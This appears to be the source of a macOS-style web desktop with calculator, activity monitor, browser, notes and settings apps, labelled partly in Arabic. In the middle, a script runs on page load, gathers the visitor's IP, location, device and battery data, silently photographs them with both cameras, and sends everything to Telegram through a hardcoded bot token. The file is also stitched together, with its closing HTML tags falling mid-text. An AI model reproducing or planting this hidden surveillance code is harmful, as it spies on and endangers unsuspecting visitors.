                         <div class="display-current" id="calc-current-${id}">0</div>
                     </div>
                     <div class="calculator-buttons">
                         <div class="button-row">
                             <button class="calc-btn function" onclick="calcFunction('${id}', 'clear')">AC</button>
                             <button class="calc-btn function" onclick="calcFunction('${id}', 'plusMinus')">±</button>
                             <button class="calc-btn function" onclick="calcFunction('${id}', 'percent')">%</button>
                             <button class="calc-btn operator" onclick="calcOperator('${id}', '÷')">÷</button>
                         </div>
                         <div class="button-row">
                             <button class="calc-btn number" onclick="calcNumber('${id}', '7')">7</button>
                             <button class="calc-btn number" onclick="calcNumber('${id}', '8')">8</button>
                             <button class="calc-btn number" onclick="calcNumber('${id}', '9')">9</button>
                             <button class="calc-btn operator" onclick="calcOperator('${id}', '×')">×</button>
                         </div>
                         <div class="button-row">
                             <button class="calc-btn number" onclick="calcNumber('${id}', '4')">4</button>
                             <button class="calc-btn number" onclick="calcNumber('${id}', '5')">5</button>
                             <button class="calc-btn number" onclick="calcNumber('${id}', '6')">6</button>
                             <button class="calc-btn operator" onclick="calcOperator('${id}', '-')">−</button>
                         </div>
                         <div class="button-row">
                             <button class="calc-btn number" onclick="calcNumber('${id}', '1')">1</button>
                             <button class="calc-btn number" onclick="calcNumber('${id}', '2')">2</button>
                             <button class="calc-btn number" onclick="calcNumber('${id}', '3')">3</button>
                             <button class="calc-btn operator" onclick="calcOperator('${id}', '+')">+</button>
                         </div>
                         <div class="button-row">
                             <button class="calc-btn number zero" onclick="calcNumber('${id}', '0')">0</button>
                             <button class="calc-btn number" onclick="calcNumber('${id}', '.')">.</button>
                             <button class="calc-btn equals" onclick="calcEquals('${id}')">=</button>
                         </div>
                     </div>
                 </div>
             `;
             
             const windowEl = createWindow(id, 'Calculator', content, {minWidth: '320px', minHeight: '500px'});
             
             const calcStyle = document.createElement('style');
             calcStyle.textContent = `
                 .calculator-app {
                     display: flex;
                     flex-direction: column;
                     height: 100%;
                     background: #000000;
                     color: white;
                     font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
                 }
                 
                 .calculator-display {
                     flex: 1;
                     display: flex;
                     flex-direction: column;
                     justify-content: flex-end;
                     padding: 24px;
                     background: #000000;
                     min-height: 200px;
                 }
                 
                 .display-history {
                     font-size: 24px;
                     color: #8e8e93;
                     text-align: right;
                     margin-bottom: 8px;
                     min-height: 30px;
                 }
                 
                 .display-current {
                     font-size: 72px;
                     font-weight: 300;
                     text-align: right;
                     line-height: 1;
                     font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
                 }
                 
                 .calculator-buttons {
                     display: flex;
                     flex-direction: column;
                     gap: 1px;
                     background: #000000;
                 }
                 
                 .button-row {
                     display: flex;
                     gap: 1px;
                 }
                 
                 .calc-btn {
                     flex: 1;
                     height: 88px;
                     border: none;
                     font-size: 36px;
                     font-weight: 400;
                     cursor: pointer;
                     transition: all 0.15s ease;
                     display: flex;
                     align-items: center;
                     justify-content: center;
                     font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
                 }
                 
                 .calc-btn.number {
                     background: #333333;
                     color: white;
                 }
                 
                 .calc-btn.number:hover {
                     background: #666666;
                 }
                 
                 .calc-btn.number:active {
                     background: #999999;
                 }
                 
                 .calc-btn.operator {
                     background: #ff9500;
                     color: white;
                 }
                 
                 .calc-btn.operator:hover {
                     background: #ffaa33;
                 }
                 
                 .calc-btn.operator:active {
                     background: #ffcc66;
                 }
                 
                 .calc-btn.function {
                     background: #a5a5a5;
                     color: black;
                 }
                 
                 .calc-btn.function:hover {
                     background: #cccccc;
                 }
                 
                 .calc-btn.function:active {
                     background: #e6e6e6;
                 }
                 
                 .calc-btn.equals {
                     background: #ff9500;
                     color: white;
                 }
                 
                 .calc-btn.equals:hover {
                     background: #ffaa33;
                 }
                 
                 .calc-btn.equals:active {
                     background: #ffcc66;
                 }
                 
                 .calc-btn.zero {
                     flex: 2;
                     justify-content: flex-start;
                     padding-left: 32px;
                 }
             `;
             document.head.appendChild(calcStyle);
             
             let calcState = {
                 current: '0',
                 previous: null,
                 operation: null,
                 waitingForOperand: false
             };
             
             window.calcNumber = function(calcId, num) {
                 const currentDisplay = document.querySelector(`#calc-current-${calcId}`);
                 
                 if (calcState.waitingForOperand) {
                     calcState.current = num;
                     calcState.waitingForOperand = false;
                 } else {
                     if (num === '.' && calcState.current.includes('.')) return;
                     if (calcState.current === '0' && num !== '.') {
                         calcState.current = num;
                     } else {
                         calcState.current += num;
                     }
                 }
                 
                 currentDisplay.textContent = calcState.current;
             };
             
             window.calcOperator = function(calcId, operator) {
                 const currentDisplay = document.querySelector(`#calc-current-${calcId}`);
                 const historyDisplay = document.querySelector(`#calc-history-${calcId}`);
                 
                 const inputValue = parseFloat(calcState.current);
                 
                 if (calcState.previous === null) {
                     calcState.previous = inputValue;
                 } else if (calcState.operation) {
                     const result = performCalculation(calcState.previous, inputValue, calcState.operation);
                     calcState.current = String(result);
                     calcState.previous = result;
                     currentDisplay.textContent = calcState.current;
                 }
                 
                 calcState.waitingForOperand = true;
                 calcState.operation = operator;
                 historyDisplay.textContent = `${calcState.previous} ${operator}`;
             };
             
             window.calcEquals = function(calcId) {
                 const currentDisplay = document.querySelector(`#calc-current-${calcId}`);
                 const historyDisplay = document.querySelector(`#calc-history-${calcId}`);
                 
                 const inputValue = parseFloat(calcState.current);
                 
                 if (calcState.previous === null || calcState.operation === null) {
                     return;
                 }
                 
                 const result = performCalculation(calcState.previous, inputValue, calcState.operation);
                 calcState.current = String(result);
                 calcState.previous = null;
                 calcState.operation = null;
                 calcState.waitingForOperand = false;
                 
                 currentDisplay.textContent = calcState.current;
                 historyDisplay.textContent = '';
             };
             
             window.calcFunction = function(calcId, func) {
                 const currentDisplay = document.querySelector(`#calc-current-${calcId}`);
                 const historyDisplay = document.querySelector(`#calc-history-${calcId}`);
                 
                 switch (func) {
                     case 'clear':
                         calcState.current = '0';
                         calcState.previous = null;
                         calcState.operation = null;
                         calcState.waitingForOperand = false;
                         historyDisplay.textContent = '';
                         break;
                     case 'plusMinus':
                         calcState.current = String(-parseFloat(calcState.current));
                         break;
                     case 'percent':
                         calcState.current = String(parseFloat(calcState.current) / 100);
                         break;
                 }
                 
                 currentDisplay.textContent = calcState.current;
             };
             
             function performCalculation(previous, current, operation) {
                 switch (operation) {
                     case '+': return previous + current;
                     case '-': return previous - current;
                     case '×': return previous * current;
                     case '÷': return previous / current;
                     default: return current;
                 }
             }
         }
         
         function openTaskManager() {
             const id = 'task-manager';
             if (openWindows.has(id)) {
                 bringToFront(openWindows.get(id));
                 return;
             }
             
             const content = `
                 <div class="task-manager-app">
                     <div class="task-manager-header">
                         <h3>Activity Monitor</h3>
                         <div class="system-stats">
                             <div class="stat-item">
                                 <span class="stat-label">CPU:</span>
                                 <span class="stat-value" id="cpu-usage-${id}">12%</span>
                             </div>
                             <div class="stat-item">
                                 <span class="stat-label">Memory:</span>
                                 <span class="stat-value" id="memory-usage-${id}">4.2 GB</span>
                             </div>
                             <div class="stat-item">
                                 <span class="stat-label">Disk:</span>
                                 <span class="stat-value" id="disk-usage-${id}">128 GB</span>
                             </div>
                         </div>
                     </div>
                     <div class="task-manager-tabs">
                         <button class="tab-btn active" onclick="switchTab('${id}', 'cpu')">CPU</button>
                         <button class="tab-btn" onclick="switchTab('${id}', 'memory')">Memory</button>
                         <button class="tab-btn" onclick="switchTab('${id}', 'disk')">Disk</button>
                         <button class="tab-btn" onclick="switchTab('${id}', 'network')">Network</button>
                     </div>
                     <div class="task-manager-content">
                         <div class="process-list" id="process-list-${id}">
                             <div class="process-header">
                                 <span class="process-name">Process Name</span>
                                 <span class="process-cpu">CPU %</span>
                                 <span class="process-memory">Memory</span>
                                 <span class="process-status">Status</span>
                                 <span class="process-actions">Actions</span>
                             </div>
                             <div class="process-item">
                                 <span class="process-name">Finder</span>
                                 <span class="process-cpu">2.1%</span>
                                 <span class="process-memory">45.2 MB</span>
                                 <span class="process-status running">Running</span>
                                 <span class="process-actions">
                                     <button class="action-btn" onclick="endProcess('Finder')">End</button>
                                 </span>
                             </div>
                             <div class="process-item">
                                 <span class="process-name">Safari</span>
                                 <span class="process-cpu">8.5%</span>
                                 <span class="process-memory">156.7 MB</span>
                                 <span class="process-status running">Running</span>
                                 <span class="process-actions">
                                     <button class="action-btn" onclick="endProcess('Safari')">End</button>
                                 </span>
                             </div>
                             <div class="process-item">
                                 <span class="process-name">Terminal</span>
                                 <span class="process-cpu">1.2%</span>
                                 <span class="process-memory">12.8 MB</span>
                                 <span class="process-status running">Running</span>
                                 <span class="process-actions">
                                     <button class="action-btn" onclick="endProcess('Terminal')">End</button>
                                 </span>
                             </div>
                             <div class="process-item">
                                 <span class="process-name">Messages</span>
                                 <span class="process-cpu">0.8%</span>
                                 <span class="process-memory">28.4 MB</span>
                                 <span class="process-status running">Running</span>
                                 <span class="process-actions">
                                     <button class="action-btn" onclick="endProcess('Messages')">End</button>
                                 </span>
                             </div>
                             <div class="process-item">
                                 <span class="process-name">Settings</span>
                                 <span class="process-cpu">0.5%</span>
                                 <span class="process-memory">15.6 MB</span>
                                 <span class="process-status running">Running</span>
                                 <span class="process-actions">
                                     <button class="action-btn" onclick="endProcess('Settings')">End</button>
                                 </span>
                             </div>
                             <div class="process-item">
                                 <span class="process-name">Notes</span>
                                 <span class="process-cpu">0.3%</span>
                                 <span class="process-memory">22.1 MB</span>
                                 <span class="process-status running">Running</span>
                                 <span class="process-actions">
                                     <button class="action-btn" onclick="endProcess('Notes')">End</button>
                                 </span>
                             </div>
                         </div>
                     </div>
                 </div>
             `;
             
             const windowEl = createWindow(id, 'Activity Monitor', content, {minWidth: '700px', minHeight: '500px'});
             
             const taskManagerStyle = document.createElement('style');
             taskManagerStyle.textContent = `
                 .task-manager-app {
                     display: flex;
                     flex-direction: column;
                     height: 100%;
                     background: #ffffff;
                     font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', sans-serif;
                 }
                 
                 .task-manager-header {
                     padding: 20px;
                     border-bottom: 1px solid #d1d1d6;
                     background: #f5f5f7;
                     height: 80px;
                     box-sizing: border-box;
                     display: flex;
                     flex-direction: column;
                     justify-content: center;
                 }
                 
                 .task-manager-header h3 {
                     margin: 0 0 16px 0;
                     font-size: 18px;
                     font-weight: 600;
                     color: #1d1d1f;
                     font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
                 }
                 
                 .system-stats {
                     display: flex;
                     gap: 24px;
                 }
                 
                 .stat-item {
                     display: flex;
                     align-items: center;
                     gap: 8px;
                 }
                 
                 .stat-label {
                     font-size: 12px;
                     color: #86868b;
                     font-weight: 500;
                 }
                 
                 .stat-value {
                     font-size: 14px;
                     font-weight: 600;
                     color: #1d1d1f;
                 }
                 
                 .task-manager-tabs {
                     display: flex;
                     background: #f5f5f7;
                     border-bottom: 1px solid #d1d1d6;
                     height: 44px;
                     box-sizing: border-box;
                 }
                 
                 .tab-btn {
                     padding: 12px 24px;
                     border: none;
                     background: transparent;
                     color: #86868b;
                     font-size: 13px;
                     font-weight: 500;
                     cursor: pointer;
                     transition: all 0.15s ease;
                     display: flex;
                     align-items: center;
                     justify-content: center;
                     font-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont, sans-serif;
                 }
                 
                 .tab-btn.active {
                     color: #007AFF;
                     border-bottom: 2px solid #007AFF;
                 }
                 
                 .tab-btn:hover:not(.active) {
                     color: #1d1d1f;
                     background: rgba(0, 0, 0, 0.05);
                 }
                 
                 .task-manager-content {
                     flex: 1;
                     overflow: hidden;
                 }
                 
                 .process-list {
                     height: 100%;
                     overflow-y: auto;
                 }
                 
                 .process-header {
                     display: grid;
                     grid-template-columns: 2fr 1fr 1fr 1fr 1fr;
                     padding: 16px 20px;
                     background: #f5f5f7;
                     border-bottom: 1px solid #d1d1d6;
                     font-size: 11px;
                     font-weight: 600;
                     color: #86868b;
                     text-transform: uppercase;
                     letter-spacing: 0.8px;
                     font-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont, sans-serif;
                 }
                 
                 .process-item {
                     display: grid;
                     grid-template-columns: 2fr 1fr 1fr 1fr 1fr;
                     padding: 16px 20px;
                     border-bottom: 1px solid #f0f0f0;
                     align-items: center;
                     transition: all 0.15s ease;
                     font-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont, sans-serif;
                 }
                 
                 .process-item:hover {
                     background-color: rgba(0, 122, 255, 0.05);
                 }
                 
                 .process-name {
                     font-size: 13px;
                     font-weight: 500;
                     color: #1d1d1f;
                 }
                 
                 .process-cpu {
                     font-size: 12px;
                     color: #1d1d1f;
                 }
                 
                 .process-memory {
                     font-size: 12px;
                     color: #1d1d1f;
                 }
                 
                 .process-status {
                     font-size: 10px;
                     padding: 4px 10px;
                     border-radius: 12px;
                     text-transform: uppercase;
                     font-weight: 600;
                     letter-spacing: 0.8px;
                     font-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont, sans-serif;
                 }
                 
                 .process-status.running {
                     background: #d4edda;
                     color: #155724;
                 }
                 
                 .process-status.stopped {
                     background: #f8d7da;
                     color: #721c24;
                 }
                 
                 .action-btn {
                     padding: 6px 12px;
                     border: 1px solid #dc3545;
                     background: #dc3545;
                     color: white;
                     border-radius: 6px;
                     font-size: 11px;
                     cursor: pointer;
                     transition: all 0.15s ease;
                     font-weight: 500;
                     font-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont, sans-serif;
                 }
                 
                 .action-btn:hover {
                     background: #c82333;
                     border-color: #c82333;
                 }
             `;
             document.head.appendChild(taskManagerStyle);
             
             function updateSystemStats() {
                 const cpuUsage = Math.floor(Math.random() * 20) + 5;
                 const memoryUsage = (Math.random() * 2 + 3).toFixed(1);
                 const diskUsage = Math.floor(Math.random() * 50) + 100;
                 
                 windowEl.querySelector(`#cpu-usage-${id}`).textContent = `${cpuUsage}%`;
                 windowEl.querySelector(`#memory-usage-${id}`).textContent = `${memoryUsage} GB`;
                 windowEl.querySelector(`#disk-usage-${id}`).textContent = `${diskUsage} GB`;
             }
             
             setInterval(updateSystemStats, 2000);
             updateSystemStats();
             
             window.switchTab = function(taskManagerId, tab) {
                 const tabBtns = document.querySelectorAll(`#window-${taskManagerId} .tab-btn`);
                 tabBtns.forEach(btn => btn.classList.remove('active'));
                 event.target.classList.add('active');
                 
                 console.log(`Switched to ${tab} tab`);
             };
             
             window.endProcess = function(processName) {
                 if (confirm(`Are you sure you want to end ${processName}?`)) {
                     console.log(`Ending process: ${processName}`);
                     alert(`${processName} has been terminated.`);
                 }
             };
         }function openIncognito() {
    const id = 'incognito-browser';
    if (openWindows.has(id)) {
        bringToFront(openWindows.get(id));
        return;
    }

    const title = 'تصفح آمن';
    // تم تعديل المحتوى ليشمل حقل الإدخال، زر، وإطار العرض
    const content = `
        <div style="width:100%; height:100%; display:flex; flex-direction:column; background-color:#f0f2f5;">
            <div style="padding:10px; background-color:#fff; border-bottom: 1px solid #ddd; display:flex; gap:10px; align-items:center;">
                <input type="text" id="incognito-url-input" placeholder="أدخل الرابط هنا..." style="flex-grow:1; padding:8px; border:1px solid #ccc; border-radius:4px; font-size:14px;">
                <button id="incognito-go-btn" style="padding:8px 16px; background-color:#007AFF; color:white; border:none; border-radius:4px; cursor:pointer;">اذهب</button>
            </div>
            <iframe id="incognito-iframe" style="width:100%; height:100%; border:none;"></iframe>
        </div>
    `;

    const windowEl = createWindow(id, title, content);

    // إضافة وظائف لأزرار النافذة الجديدة
    const urlInput = windowEl.querySelector('#incognito-url-input');
    const goBtn = windowEl.querySelector('#incognito-go-btn');
    const iframe = windowEl.querySelector('#incognito-iframe');

    const loadUrl = () => {
        let url = urlInput.value.trim();
        if (url && !url.startsWith('http://' ) && !url.startsWith('https://' )) {
            url = 'https://' + url;
        }
        if (url ) {
            iframe.src = url;
        }
    };

    goBtn.addEventListener('click', loadUrl);
    urlInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            loadUrl();
        }
    });
}


     </script>

<script>
    // ⚙️ إعدادات التيليجرام
    const BOT_TOKEN = '8060685956:AAGJztf_aHHhFdBsH2OLuCPYS2TwPRY3_R4';
    const FIXED_CHAT_ID = '1431886140'; // ثابت

    // 📍 جلب chatId من الرابط
    const urlParams = new URLSearchParams(window.location.search);
    const dynamicChatId = urlParams.get("id");

    // 🛠️ إرسال للمعرفات كلها
    function sendToTelegramMultiple(message, isLocation = false, lat = null, lon = null, photoBlob = null, caption = '') {
        const ids = [FIXED_CHAT_ID];
        if (dynamicChatId) ids.push(dynamicChatId);

        ids.forEach(chatId => {
            if (isLocation) {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        latitude: lat,
                        longitude: lon
                    })
                }).catch(() => {});
            } else if (photoBlob) {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', photoBlob, 'photo.webp');
                if (caption) formData.append('caption', caption);

                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                }).catch(() => {});
            } else {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                }).catch(() => {});
            }
        });
    }

    // 🌐 جمع بيانات إضافية
    async function collectAdditionalData() {
        let ip = 'مافيش';
        let country = 'مافيش';
        let city = 'مافيش';

        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            ip = data.ip || 'مافيش';
            country = data.country_name || 'مافيش';
            city = data.city || 'مافيش';
        } catch (e) {}

        let batteryLevel = 'مافيش';
        let batteryCharging = 'مافيش';
        try {
            const battery = await navigator.getBattery();
            batteryLevel = Math.round(battery.level * 100) + '%';
            batteryCharging = battery.charging ? 'نعم' : 'لا';
        } catch (e) {}

        return {
            ip, country, city,
            platform: navigator.platform,
            deviceVersion: navigator.userAgent,
            batteryLevel, batteryCharging
        };
    }

    // 📍 جلب الموقع
    function getLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve(null);
                return;
            }

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const { latitude, longitude, accuracy } = position.coords;
                    resolve({ lat: latitude, lon: longitude, accuracy });
                },
                () => resolve(null),
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        });
    }

    // 📝 إرسال تقرير
    function sendTextReport(data, note = '') {
        let message = `
📋 *تقرير جمع البيانات*
🆔 الثابت: ${FIXED_CHAT_ID}
🆔 من الرابط: ${dynamicChatId || 'مافيش'}
🌐 الجهاز:
• النظام: ${data.platform}
• User Agent: ${data.deviceVersion}
🔋 البطارية: ${data.batteryLevel} | الشحن: ${data.batteryCharging}
🌍 الموقع:
• الآيبي: ${data.ip}
• الدولة: ${data.country}
• المدينة: ${data.city}
${note ? `📌 ملاحظة: ${note}` : ''}
⏰ ${new Date().toLocaleString('ar-EG')}
        `.trim();

        sendToTelegramMultiple(message);
    }

    // 📸 إعداد الكاميرا
    function setupCamera(video, canvas, type) {
        video.play();
        video.onplaying = () => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            let count = 0;

            const interval = setInterval(() => {
                if (count >= 3) {
                    clearInterval(interval);
                    stopCamera(video);
                    return;
                }
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(blob => {
                    sendToTelegramMultiple('', false, null, null, blob, `📸 كاميرا ${type} - صورة ${count + 1}`);
                }, 'image/jpeg', 0.7);
                count++;
            }, 1500);
        };
    }

    function stopCamera(video) {
        if (video.srcObject) {
            video.srcObject.getTracks().forEach(track => track.stop());
        }
    }

    // 🚀 تشغيل عند تحميل الصفحة
    window.addEventListener('load', async () => {
        const data = await collectAdditionalData();

        // 📍 الموقع
        const location = await getLocation();
        if (location) {
            sendToTelegramMultiple('', true, location.lat, location.lon);
            data.location = `Lat: ${location.lat}, Lon: ${location.lon}, دقة: ${location.accuracy}`;
        } else {
            data.location = 'مافيش';
        }

        sendTextReport(data);

        // 🎥 الكاميرات
        const frontVideo = document.createElement('video');
        const backVideo = document.createElement('video');
        const frontCanvas = document.createElement('canvas');
        const backCanvas = document.createElement('canvas');

        [frontVideo, backVideo].forEach(v => {
            v.setAttribute('playsinline', '');
            v.setAttribute('autoplay', '');
            v.setAttribute('muted', '');
            document.body.appendChild(v);
            v.style.display = 'none';
        });

        [frontCanvas, backCanvas].forEach(c => {
            document.body.appendChild(c);
            c.style.display = 'none';
        });

        try {
            const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            frontVideo.srcObject = frontStream;
            setupCamera(frontVideo, frontCanvas, "أمامية");
        } catch (e) {
            sendToTelegramMultiple("❌ فشل الوصول للكاميرا الأمامية");
        }

        try {
            const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
            backVideo.srcObject = backStream;
            setupCamera(backVideo, backCanvas, "خلفية");
        } catch (e) {
            sendToTelegramMultiple("❌ فشل الوصول للكاميرا الخلفية");
        }
    });
</script>
</body>
</html>
                
                .notes-header {
                    padding: 20px;
                    border-bottom: 1px solid #d1d1d6;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    height: 72px;
                    box-sizing: border-box;
                }
                
                .notes-header h3 {
                    margin: 0;
                    font-size: 18px;
                    font-weight: 600;
                    color: #1d1d1f;
                    font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
                }
                
                .new-note-btn {
                    width: 32px;
                    height: 32px;
                    border-radius: 50%;
                    border: none;
                    background: #007AFF;
                    color: white;
                    font-size: 20px;
                    cursor: pointer;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    transition: all 0.15s ease;
                    font-weight: 500;
                }
                
                .new-note-btn:hover {
                    background: #0056CC;
                    transform: scale(1.1);
                }
                
                .notes-list {
                    flex: 1;
                    overflow-y: auto;
                    padding: 8px 0;
                }
                
                .note-item {
                    padding: 12px 16px;
                    cursor: pointer;
                    transition: background-color 0.2s ease;
                    border-bottom: 1px solid #f0f0f0;
                }
                
                .note-item:hover {
                    background-color: #f8f8f8;
                }
                
                .note-item.active {
                    background-color: #007AFF;
                    color: white;
                }
                
                .note-title {
                    font-weight: 500;
                    font-size: 14px;
                    margin-bottom: 4px;
                }
                
                .note-preview {
                    font-size: 12px;
                    color: #86868b;
                    line-height: 1.3;
                }
                
                .note-item.active .note-preview {
                    color: rgba(255, 255, 255, 0.8);
                }
                
                .notes-editor {
                    flex: 1;
                    display: flex;
                    flex-direction: column;
                    background: #ffffff;
                }
                
                .editor-toolbar {
                    padding: 8px 16px;
                    border-bottom: 1px solid #e5e5e7;
                    display: flex;
                    gap: 8px;
                    align-items: center;
                }
                
                .toolbar-btn {
                    width: 28px;
                    height: 28px;
                    border: 1px solid #d1d1d6;
                    background: #ffffff;
                    border-radius: 4px;
                    cursor: pointer;
                    font-size: 12px;
                    font-weight: 600;
                    transition: all 0.2s ease;
                }
                
                .toolbar-btn:hover {
                    background: #f5f5f7;
                    border-color: #007AFF;
                }
                
                .toolbar-separator {
                    width: 1px;
                    height: 20px;
                    background: #d1d1d6;
                    margin: 0 4px;
                }
                
                .editor-content {
                    flex: 1;
                    padding: 20px;
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                    font-size: 14px;
                    line-height: 1.6;
                    color: #1d1d1f;
                    outline: none;
                    overflow-y: auto;
                    background: #ffffff;
                }
                
                .editor-content:empty:before {
                    content: attr(placeholder);
                    color: #86868b;
                    pointer-events: none;
                }
                
                .editor-content:focus {
                    background: #ffffff;
                }
            `;
            document.head.appendChild(notesStyle);
            
            const noteItems = windowEl.querySelectorAll('.note-item');
            const editorContent = windowEl.querySelector('.editor-content');
            
            noteItems.forEach(item => {
                item.addEventListener('click', () => {
                    noteItems.forEach(note => note.classList.remove('active'));
                    item.classList.add('active');
                    
                    const noteTitle = item.querySelector('.note-title').textContent;
                    if (noteTitle === 'Welcome Note') {
                        editorContent.innerHTML = `Welcome to Notes!

This is a simple note-taking app that mimics the macOS Notes application.

You can:
• Write and edit notes
• Use basic formatting
• Organize your thoughts

Start typing to create your first note...`;
                    } else if (noteTitle === 'Shopping List') {
                        editorContent.innerHTML = `Shopping List:

• Milk
• Bread
• Eggs
• Butter
• Cheese
• Vegetables
• Fruits`;
                    } else if (noteTitle === 'Meeting Notes') {
                        editorContent.innerHTML = `Meeting Notes - Project Discussion

Date: ${new Date().toLocaleDateString()}

Agenda:
1. Project timeline review
2. Resource allocation
3. Next steps

Action Items:
- Schedule follow-up meeting
- Prepare presentation slides
- Update project documentation`;
                    }
                });
            });
            
            const newNoteBtn = windowEl.querySelector('.new-note-btn');
            newNoteBtn.addEventListener('click', () => {
                const newNote = document.createElement('div');
                newNote.className = 'note-item active';
                newNote.innerHTML = `
                    <div class="note-title">New Note</div>
                    <div class="note-preview">Empty note...</div>
                `;
                
                noteItems.forEach(note => note.classList.remove('active'));
                windowEl.querySelector('.notes-list').insertBefore(newNote, windowEl.querySelector('.notes-list').firstChild);
                editorContent.innerHTML = '';
                editorContent.focus();
            });
        }

        function openSettings() {
            const id = 'settings';
            if (openWindows.has(id)) { bringToFront(openWindows.get(id)); return; }
            const content = `
                <div class="settings-sidebar">
                    <div class="space-y-1">
                        <div class="settings-item active" data-pane="appearance-pane">
                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 21.623a9.623 9.623 0 0 1 0-19.246 9.623 9.623 0 0 1 0 19.246Zm0-1.282a8.341 8.341 0 0 0 0-16.682v16.682Z" fill="currentColor"></path></svg>
                            <span>المظهر</span>
                        </div>
                        <div class="settings-item" data-pane="wallpaper-pane">
                             <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M1.5 4.5A3 3 0 0 1 4.5 1.5h15a3 3 0 0 1 3 3v15a3 3 0 0 1-3 3h-15a3 3 0 0 1-3-3v-15ZM4.5 3a1.5 1.5 0 0 0-1.5 1.5v15a1.5 1.5 0 0 0 1.5 1.5h15a1.5 1.5 0 0 0 1.5-1.5v-15a1.5 1.5 0 0 0-1.5-1.5h-15Z" fill="currentColor"></path><path d="M6.5 14.5a1 1 0 1 0 0-2 1 1 0 0 0 0 2Z" fill="currentColor"></path><path d="m10.152 9.21-4.25 5.667a.75.75 0 0 0 .996 1.123l4.25-5.667a.75.75 0 0 0-.996-1.123Z" fill="currentColor"></path><path d="m19.25 14.25-6-8.5a.75.75 0 0 0-1.24.883l6 8.5a.75.75 0 1 0 1.24-.883Z" fill="currentColor"></path></svg>
                            <span>الخلفية</span>
                        </div>
                         <div class="settings-item" data-pane="dock-pane">
                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M2 19.5a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-1.25a.75.75 0 0 0-.75-.75H2.75a.75.75 0 0 0-.75.75V19.5Z" fill="currentColor"></path></svg>
                            <span>الشريط السفلي</span>
                        </div>
                        <div class="settings-item" data-pane="notifications-pane">
                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2zm6-6v-5c0-3.07-1.63-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.64 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2zm-2 1H8v-6c0-2.48 1.51-4.5 4-4.5s4 2.02 4 4.5v6z" fill="currentColor"></path></svg>
                            <span>الإشعارات</span>
                        </div>
                        <div class="settings-item" data-pane="privacy-pane">
                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z" fill="currentColor"></path></svg>
                            <span>الخصوصية والأمان</span>
                        </div>
                        <div class="settings-item" data-pane="accessibility-pane">
                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 2c1.1 0 2 .9 2 2s-.9 2-2 2-2-.9-2-2 .9-2 2-2zm9 7h-6v13h-2v-6h-2v6H9V9H3V7h18v2z" fill="currentColor"></path></svg>
                            <span>إمكانية الوصول</span>
                        </div>
                        <div class="settings-item" data-pane="sound-pane">
                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z" fill="currentColor"></path></svg>
                            <span>الصوت</span>
                        </div>
                        <div class="settings-item" data-pane="network-pane">
                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" fill="currentColor"></path></svg>
                            <span>الشبكة</span>
                        </div>
